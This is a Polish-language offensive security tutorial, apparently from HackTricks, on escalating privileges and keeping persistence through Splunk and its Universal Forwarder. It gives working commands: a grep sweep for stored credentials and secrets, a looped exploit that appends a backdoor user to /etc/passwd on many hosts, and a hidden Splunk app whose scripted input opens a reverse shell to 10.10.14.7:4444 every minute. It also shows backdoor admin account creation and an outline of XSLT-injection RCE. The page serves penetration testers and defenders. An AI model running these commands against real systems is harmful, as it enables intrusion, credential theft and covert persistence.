# Splunk LPE i Persistence

{{#include ../../banners/hacktricks-training.md}}

Jeśli podczas **enumerating** maszyny **internally** lub **externally** znajdziesz **Splunk running** (zwykle **8000** dla web UI i **8089** dla management API), prawidłowe dane uwierzytelniające często można wykorzystać do **code execution** poprzez instalację aplikacji, scripted inputs lub działania administracyjne. Jeśli Splunk działa jako **root**, często prowadzi to do natychmiastowej **privilege escalation**.

Jeśli potrzebujesz tylko ogólnego remote attack surface, enumeracji lub ścieżki RCE przez upload aplikacji, sprawdź:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Jeśli **already root** i usługa Splunk nie nasłuchuje wyłącznie na localhost, możesz również wykraść **Splunk password hashes**, odzyskać **encrypted secrets** lub wdrożyć **malicious app**, aby utrzymać persistence lokalnie albo na wielu forwarderach.

## Interesujące pliki lokalne

Po uzyskaniu dostępu do hosta z uruchomionym Splunk lub Splunk Universal Forwarder te ścieżki są zwykle najbardziej interesujące:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Ważne artefakty:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni użytkownicy Splunk i hashe haseł.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: klucz używany przez Splunk do szyfrowania sekretów przechowywanych w kilku plikach `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: początkowy plik bootstrap administratora; przydatny w gold images i przypadku błędów provisioningu. Jest ignorowany, jeśli `etc/passwd` już istnieje.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: miejsce, w którym często włącza się scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** lub **`$SPLUNK_HOME/etc/apps/`**: dobre miejsca do ukrycia persistent app lub sprawdzenia, co jest już dystrybuowane.

## Podsumowanie exploita Splunk Universal Forwarder Agent

Więcej szczegółów znajdziesz pod adresem [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie:<sup>[[1]](#references)</sup>

**Omówienie exploita:**
Exploit ukierunkowany na Splunk Universal Forwarder (UF) pozwala attackerom posiadającym **hasło agenta** wykonywać dowolny kod w systemach, na których działa agent, potencjalnie przejmując znaczną część środowiska.

**Dlaczego działa:**

- Usługa zarządzania UF jest często wystawiona na **TCP 8089**.
- Attackers mogą uwierzytelnić się w API i nakazać forwarderowi zainstalowanie **malicious app bundle**.
- Ten sam primitive może być użyty lokalnie do **LPE** lub zdalnie do **RCE**.
- Publiczne narzędzia, takie jak **SplunkWhisperer2**, automatycznie tworzą app bundle i mogą dostosowywać payloady dla celów Linux.

**Typowe sposoby odzyskania hasła:**

- Dane uwierzytelniające w cleartext w dokumentacji, skryptach, share'ach lub automatyzacji deploymentu.
- Hashe haseł w `$SPLUNK_HOME/etc/passwd`, a następnie offline cracking.
- Golden images lub pozostałości provisioningu, takie jak `user-seed.conf`.

**Wpływ:**

- Wykonywanie kodu na poziomie SYSTEM/root na każdym przejętym hoście.
- Deployment persistent apps, backdoorów lub ransomware.
- Wyłączanie lub manipulowanie telemetry before the data is forwarded.

**Przykładowe polecenie do przeprowadzenia exploita:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Publicznie dostępne exploity:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Jeśli masz **dostęp do zapisu w systemie plików** jako `root`/`splunk` lub uwierzytelniony dostęp umożliwiający instalowanie aplikacji, bardzo niezawodnym mechanizmem persistence jest umieszczenie **niestandardowej aplikacji** zawierającej **scripted input**.<sup>[[2]](#references)</sup> Dokumentacja Splunk zakłada, że scripted inputs znajdują się w katalogu aplikacji i są włączane z poziomu `inputs.conf`.

Typowy układ:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalny `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Szybki dropper na Linuxa:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Uwagi:

- Ta sama sztuczka działa w przypadku **Universal Forwarder** z użyciem `/opt/splunkforwarder/etc/apps/`.
- Atakujący często wtapiają się w środowisko, modyfikując legalny add-on zamiast tworzyć oczywiście złośliwą aplikację.
- Na **deployment server** umieszczenie złośliwej aplikacji w `deployment-apps/` prowadzi do **fleet-wide persistence**, ponieważ forwardery odpytują serwer, pobierają zaktualizowane aplikacje i często uruchamiają się ponownie, aby je zastosować.

## Kradzież danych uwierzytelniających i przejęcie konta administratora

Jeśli możesz odczytywać lokalne pliki Splunk, zazwyczaj istnieją dwa dobre cele: odzyskanie **Splunk admin access** oraz odzyskanie **encrypted service credentials**.

### Hashes haseł i użytkownicy lokalni

Splunk przechowuje lokalne dane uwierzytelniania w `etc/passwd`. W zależności od wdrożenia złamanie tego pliku może umożliwić odzyskanie działających danych uwierzytelniających do web UI i management API.

Jeśli masz już prawidłowe dane uwierzytelniające **admin**, a Splunk korzysta z **native** authentication backend, sam CLI może zostać użyty do persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i zaszyfrowane wartości

Splunk używa `etc/auth/splunk.secret` do ochrony wrażliwych wartości przechowywanych w wielu plikach konfiguracyjnych. Jeśli uda ci się wykraść zarówno **secret**, jak i odpowiednie pliki **`.conf`**, często możesz odzyskać lub ponownie wykorzystać:

- współdzielone secret forwardera/indexera, takie jak `pass4SymmKey`
- hasła kluczy prywatnych TLS, takie jak `sslPassword`
- dane uwierzytelniające LDAP bind, takie jak `bindDNPassword`

Jest to przydatne podczas **lateral movement**, nawet gdy hasła administratora Splunk nie da się złamać.

### Abuse `user-seed.conf`

`user-seed.conf` jest odczytywany tylko podczas pierwszego uruchomienia lub gdy `etc/passwd` nie istnieje. Z tego powodu jest mniej przydatny na działającym hoście, ale bardzo interesujący w przypadku:

- przejętych templates instalacyjnych
- obrazów kontenerów
- unattended provisioning workflows
- appliance'ów, na których Splunk jest automatycznie inicjalizowany ponownie

W takich przypadkach umieszczenie `HASHED_PASSWORD` wygenerowanego za pomocą `splunk hash-passwd` daje cichy sposób na odzyskanie dostępu administratora po ponownym wdrożeniu.

## Abuse Splunk Queries

Więcej szczegółów znajdziesz na stronie [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Przydatną, stosunkowo nową techniką jest wykorzystanie **XSLT** dostarczanego przez użytkownika w podatnych wersjach Splunk Enterprise w celu przekształcenia uwierzytelnionego konta o niskich uprawnieniach w możliwość **wykonywania poleceń systemu operacyjnego** jako użytkownik `splunk`.

Przebieg na wysokim poziomie:

1. Uwierzytelnij się w Splunk.
2. Prześlij złośliwy plik **XSL** za pośrednictwem funkcji preview/upload.
3. Spraw, aby Splunk renderował wyniki wyszukiwania przy użyciu przesłanego stylesheetu z katalogu **dispatch**.
4. Użyj payloadu XSLT do zapisania pliku lub wywołania execution za pośrednictwem search pipeline Splunk (na przykład przez uzyskanie dostępu do wewnętrznej funkcji, takiej jak `runshellscript`).

Najważniejszym wnioskiem ofensywnym jest to, że ta ścieżka zapewnia **post-auth RCE bez potrzeby app upload**. W systemie Linux zwykle uzyskuje się dostęp jako konto **`splunk`**, które nadal jest cenne, ponieważ ten użytkownik często jest właścicielem drzewa aplikacji, może odczytywać sekrety i umieszczać persistent apps, które przetrwają utratę shella.

Reprezentatywna ścieżka używana podczas exploitation to:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Jeśli Splunk działa z nadmiernymi uprawnieniami lub użytkownik `splunk` ma dostęp do niebezpiecznych skryptów, zapisywalnych jednostek usług albo nieprawidłowych reguł `sudo`, może to doprowadzić do prostego łańcucha **LPE**.

## Referencje

- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
